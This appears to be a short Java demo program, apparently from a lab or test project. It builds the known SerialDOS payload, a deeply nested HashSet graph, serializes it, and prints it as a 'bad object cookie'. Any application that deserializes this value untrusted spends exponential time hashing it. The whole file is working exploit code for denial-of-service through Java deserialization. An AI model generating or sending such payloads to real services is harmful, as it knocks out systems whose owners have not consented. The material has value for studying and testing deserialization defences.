package simple;

import java.util.HashSet;
import java.util.Set;

public class BadObj {
    // SerialDOS, published by Wouter Coekaerts in 2015.
    @SuppressWarnings("unchecked")
    public static void main(String[] args) {
        Set root = new HashSet();
        Set s1 = root;
        Set s2 = new HashSet();
        for (int i = 0; i < 100; i++) {
            Set t1 = new HashSet();
            Set t2 = new HashSet();
            t1.add("foo");
            s1.add(t1);
            s1.add(t2);
            s2.add(t1);
            s2.add(t2);
            s1 = t1;
            s2 = t2;
        }
        System.out.println("Your bad object cookie is: " + Serializer.serialize(root));
    }
}